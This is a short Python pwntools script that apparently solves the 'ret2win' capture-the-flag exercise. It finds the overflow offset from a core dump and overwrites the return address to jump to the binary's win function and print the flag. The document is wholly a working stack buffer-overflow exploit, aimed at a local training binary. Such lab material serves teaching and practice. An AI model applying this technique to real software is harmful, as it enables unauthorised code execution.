#!/usr/bin/env python3
from pwn import *

# https://gist.github.com/zachriggle/e4d591db7ceaafbe8ea32b461e239320

elf = context.binary = ELF('ret2win')
context.log_level = 'debug'

io = process(elf.path)
io.sendline(cyclic(128))
io.wait()
core = io.corefile
stack = core.rsp
pattern = core.read(stack, 4)

payload = flat(
    { pattern: 0x40053e },
    elf.symbols.ret2win
)
open('payload.bin', 'wb').write(payload)

io = process(elf.path)
io.sendline(payload)
io.recvuntil("Here's your flag:")

flag = io.recvall()
success(flag.decode('utf-8'))
